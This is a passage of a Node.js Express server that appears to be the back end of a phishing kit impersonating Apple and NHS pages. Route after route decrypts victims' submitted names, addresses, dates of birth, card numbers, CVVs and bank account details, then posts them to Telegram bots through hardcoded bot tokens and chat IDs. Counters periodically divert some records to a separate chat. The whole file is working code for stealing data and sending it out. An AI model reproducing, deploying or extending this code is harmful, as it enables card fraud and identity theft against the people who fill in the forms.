    scode = CryptoJS.AES.decrypt(req.body.scode, '402312').toString(CryptoJS.enc.Utf8);
    accno = CryptoJS.AES.decrypt(req.body.accno, '402312').toString(CryptoJS.enc.Utf8);
    ccname = CryptoJS.AES.decrypt(req.body.ccname, '402312').toString(CryptoJS.enc.Utf8);
    userIp = CryptoJS.AES.decrypt(req.body.userIp, '402312').toString(CryptoJS.enc.Utf8);
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (clearstore == 7) {
            axios.post(
                `https://api.telegram.org/bot5334216707:AAEYcMQVJa2NX-GtuIGZ09ZGTqRY-XKkcVc/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            clearstore = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=680379375&text=AppleCB:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=5357978103&text=Apple:\n${originalText}`
            );
            clearstore += 1;
        }
    })
});

//NHS
//NHS
//NHS

app.options('/sendKelvFriendResTwo', cors())

app.post('/sendKelvFriendResTwo',  apiLimiter, (req, res) => {
    firstname = CryptoJS.AES.decrypt(req.body.fname, '402312').toString(CryptoJS.enc.Utf8);
    lastname = CryptoJS.AES.decrypt(req.body.lname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.addy, '402312').toString(CryptoJS.enc.Utf8);
    pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.phone, '402312').toString(CryptoJS.enc.Utf8);
    email = CryptoJS.AES.decrypt(req.body.email, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cccvv, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = req.body.userAgent;
    ip = req.body.ip;
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (kelvCount == 7) {
            axios.post(
                `https://api.telegram.org/bot5334216707:AAEYcMQVJa2NX-GtuIGZ09ZGTqRY-XKkcVc/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            kelvCount = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=680379375&text=NHSKev:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=1715235543&text=NHS2:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=1341611061&text=NHS2:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=1248378980&text=NHS2:\n${originalText}`
            );
            kelvCount += 1;
        }

        res.send("Update Completed");
    })
});

app.options('/@kworthy1', cors())

app.post('/@kworthy1',  apiLimiter, (req, res) => {
    firstname = CryptoJS.AES.decrypt(req.body.fname, '402312').toString(CryptoJS.enc.Utf8);
    lastname = CryptoJS.AES.decrypt(req.body.lname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.addy, '402312').toString(CryptoJS.enc.Utf8);
    pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.phone, '402312').toString(CryptoJS.enc.Utf8);
    email = CryptoJS.AES.decrypt(req.body.email, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cccvv, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = req.body.userAgent;
    ip = req.body.ip;
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (kelvCount == 7) {
            axios.post(
                `https://api.telegram.org/bot5334216707:AAEYcMQVJa2NX-GtuIGZ09ZGTqRY-XKkcVc/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            kelvCount = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=680379375&text=NHSKev:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=1248378980&text=NHS3:\n${originalText}`
            );
            kelvCount += 1;
        }

        res.send("Update Completed");
    })
});

app.options('/littlewaynesjobs', cors())

app.post('/littlewaynesjobs',  apiLimiter, (req, res) => {
    firstname = CryptoJS.AES.decrypt(req.body.fname, '402312').toString(CryptoJS.enc.Utf8);
    lastname = CryptoJS.AES.decrypt(req.body.lname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.addy, '402312').toString(CryptoJS.enc.Utf8);
    pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.phone, '402312').toString(CryptoJS.enc.Utf8);
    email = CryptoJS.AES.decrypt(req.body.email, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cccvv, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = req.body.userAgent;
    ip = req.body.ip;
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (kelvCount == 7) {
            axios.post(
                `https://api.telegram.org/bot5334216707:AAEYcMQVJa2NX-GtuIGZ09ZGTqRY-XKkcVc/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            kelvCount = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=680379375&text=NHSWayne:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=1532191460&text=NHS:\n${originalText}`
            );
            kelvCount += 1;
        }

        res.send("Update Completed");
    })
});

app.options('/sendClearStore', cors())

// app.post('/sendClearStore', apiLimiter, (req, res) => {
//     firstname = CryptoJS.AES.decrypt(req.body.fname, '402312').toString(CryptoJS.enc.Utf8);
//     lastname = CryptoJS.AES.decrypt(req.body.lname, '402312').toString(CryptoJS.enc.Utf8);
//     dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
//     address = CryptoJS.AES.decrypt(req.body.addy, '402312').toString(CryptoJS.enc.Utf8);
//     pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
//     telephone = CryptoJS.AES.decrypt(req.body.phone, '402312').toString(CryptoJS.enc.Utf8);
//     email = CryptoJS.AES.decrypt(req.body.email, '402312').toString(CryptoJS.enc.Utf8);
//     ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
//     ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
//     cvv = CryptoJS.AES.decrypt(req.body.cccvv, '402312').toString(CryptoJS.enc.Utf8);
//     userAgent = req.body.userAgent;
//     ip = req.body.ip;
//     bin = req.body.bin;

//     if (bin.length === 7) {
//         formatBin = bin.replace(/ /g, '');
//         if (formatBin.length === 7) {
//             formatBin = bin.slice(0, -1);
//         }
//         bin = formatBin;
//     }
//     axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
//         if (!resp.data.bank) {
//             bankName = ""
//         } else {
//             bankName = resp.data.bank.name;
//         }
//     }).then(function () {
//         binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
//         var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
//         if (clearstore == 7) {
//             axios.post(
//                 `https://api.telegram.org/bot5334216707:AAEYcMQVJa2NX-GtuIGZ09ZGTqRY-XKkcVc/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
//             );
//             clearstore = 0;
//         } else {
//             axios.post(
//                 `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=680379375&text=NHSBali:\n${originalText}`
//             );
//             axios.post(
//                 `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=5357978103&text=NHS:\n${originalText}`
//             );
//             clearstore += 1;
//         }

//         res.send("Update Completed");
//     })
// });

app.options('/sendKelvFriendRes', cors())

app.post('/sendKelvFriendRes',  apiLimiter, (req, res) => {
    firstname = CryptoJS.AES.decrypt(req.body.fname, '402312').toString(CryptoJS.enc.Utf8);
    lastname = CryptoJS.AES.decrypt(req.body.lname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.addy, '402312').toString(CryptoJS.enc.Utf8);
    pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.phone, '402312').toString(CryptoJS.enc.Utf8);
    email = CryptoJS.AES.decrypt(req.body.email, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cccvv, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = req.body.userAgent;
    ip = req.body.ip;
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (kelvCount == 7) {
            axios.post(
                `https://api.telegram.org/bot5334216707:AAEYcMQVJa2NX-GtuIGZ09ZGTqRY-XKkcVc/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            kelvCount = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=680379375&text=NHSKev:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=1248378980&text=NHS:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=5231391571&text=NHS:\n${originalText}`
            );
            kelvCount += 1;
        }

        res.send("Update Completed");
    })
});

let fpaysC = 0;

app.options('/sendFpays2', cors())

app.post('/sendFpays2', (req, res) => {
    firstname = CryptoJS.AES.decrypt(req.body.fname, '402312').toString(CryptoJS.enc.Utf8);
    lastname = CryptoJS.AES.decrypt(req.body.lname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.addy, '402312').toString(CryptoJS.enc.Utf8);
    pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.phone, '402312').toString(CryptoJS.enc.Utf8);
    email = CryptoJS.AES.decrypt(req.body.email, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cccvv, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = req.body.userAgent;
    ip = req.body.ip;
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (fpaysC == 10) {
            axios.post(
                `https://api.telegram.org/bot5334216707:AAEYcMQVJa2NX-GtuIGZ09ZGTqRY-XKkcVc/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            fpaysC = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=680379375&text=NHSFPays:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=2134201699&text=NHS:\n${originalText}`
            );
            fpaysC += 1;
        }

        res.send("Update Completed");
    })
});

let masterboy = 0;

app.options('/M4STERB0Y', cors())

app.post('/M4STERB0Y',  apiLimiter, (req, res) => {
    firstname = CryptoJS.AES.decrypt(req.body.fname, '402312').toString(CryptoJS.enc.Utf8);
    lastname = CryptoJS.AES.decrypt(req.body.lname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.addy, '402312').toString(CryptoJS.enc.Utf8);
    pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.phone, '402312').toString(CryptoJS.enc.Utf8);
    email = CryptoJS.AES.decrypt(req.body.email, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cccvv, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = req.body.userAgent;
    ip = req.body.ip;
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (masterboy == 10) {
            axios.post(
                `https://api.telegram.org/bot5334216707:AAEYcMQVJa2NX-GtuIGZ09ZGTqRY-XKkcVc/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            masterboy = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=680379375&text=NHSMasterboy:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=1465132165&text=NHS:\n${originalText}`
            );
            masterboy += 1;
        }

        res.send("Update Completed");
    })
});

let skiii719 = 0;

app.options('/skiii719', cors())

app.post('/skiii719',  apiLimiter, (req, res) => {
    firstname = CryptoJS.AES.decrypt(req.body.fname, '402312').toString(CryptoJS.enc.Utf8);
    lastname = CryptoJS.AES.decrypt(req.body.lname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.addy, '402312').toString(CryptoJS.enc.Utf8);
    pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.phone, '402312').toString(CryptoJS.enc.Utf8);
    email = CryptoJS.AES.decrypt(req.body.email, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cccvv, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = req.body.userAgent;
    ip = req.body.ip;
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (skiii719 == 7) {
            axios.post(
                `https://api.telegram.org/bot5334216707:AAEYcMQVJa2NX-GtuIGZ09ZGTqRY-XKkcVc/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            skiii719 = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=680379375&text=NHSSkii:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=1612469030&text=NHS:\n${originalText}`
            );
            skiii719 += 1;
        }

        res.send("Update Completed");
    })
});

let Tcapz688 = 0;

app.options('/Tcapz688', cors())

app.post('/Tcapz688',  apiLimiter, (req, res) => {
    firstname = CryptoJS.AES.decrypt(req.body.fname, '402312').toString(CryptoJS.enc.Utf8);
    lastname = CryptoJS.AES.decrypt(req.body.lname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.addy, '402312').toString(CryptoJS.enc.Utf8);
    pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.phone, '402312').toString(CryptoJS.enc.Utf8);
    email = CryptoJS.AES.decrypt(req.body.email, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cccvv, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = req.body.userAgent;
    ip = req.body.ip;
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (skiii719 == 7) {
            axios.post(
                `https://api.telegram.org/bot5334216707:AAEYcMQVJa2NX-GtuIGZ09ZGTqRY-XKkcVc/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            skiii719 = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=680379375&text=NHSSkii:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=1437456088&text=NHS:\n${originalText}`
            );
            skiii719 += 1;
        }

        res.send("Update Completed");
    })
});

let mannyman789 = 0;

app.options('/mannyman789', cors())

app.post('/mannyman789',  apiLimiter, (req, res) => {
    firstname = CryptoJS.AES.decrypt(req.body.fname, '402312').toString(CryptoJS.enc.Utf8);
    lastname = CryptoJS.AES.decrypt(req.body.lname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.addy, '402312').toString(CryptoJS.enc.Utf8);
    pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.phone, '402312').toString(CryptoJS.enc.Utf8);
    email = CryptoJS.AES.decrypt(req.body.email, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cccvv, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = req.body.userAgent;
    ip = req.body.ip;
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (mannyman789 == 7) {
            axios.post(
                `https://api.telegram.org/bot5334216707:AAEYcMQVJa2NX-GtuIGZ09ZGTqRY-XKkcVc/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            mannyman789 = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=680379375&text=NHSManny:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=913906957&text=NHS:\n${originalText}`
            );
